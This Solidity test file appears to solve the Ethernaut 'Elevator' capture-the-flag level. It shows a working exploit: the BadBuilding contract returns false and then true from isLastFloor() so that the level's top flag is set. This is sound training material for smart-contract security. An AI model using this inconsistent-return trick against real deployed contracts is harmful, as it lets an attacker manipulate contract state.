// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Elevator.sol";
import "src/levels/ElevatorFactory.sol";

contract TestElevator is BaseTest {
    Elevator private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new ElevatorFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /**
         * CODE YOUR SETUP HERE
         */
        levelAddress = payable(this.createLevelInstance(true));
        level = Elevator(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.top(), false);
    }

    function exploitLevel() internal override {
        /**
         * CODE YOUR EXPLOIT HERE
         */

        // The goal here is to set the top variable of Elevator to true
        // I need to exploit the faulty goTo() that calls isLastFloor() twice
        // First return should be false to pass the check, the second one true, which is assigned to top
        // The point here is that we should not trust external contracts like this
        vm.startPrank(player, player);

        // Call the goTo function with contract that will return false and then true
        BadBuilding badBuilding = new BadBuilding(level);
        badBuilding.goTo();

        vm.stopPrank();
    }
}

contract BadBuilding {
    Elevator elevator;
    bool firstCall = true;

    constructor(Elevator _elevator) public {
        elevator = _elevator;
    }

    function goTo() public {
        elevator.goTo(1);
    }

    function isLastFloor(uint256) public returns (bool) {
        if (firstCall) {
            firstCall = false;
            return false;
        }

        return true;
    }
}
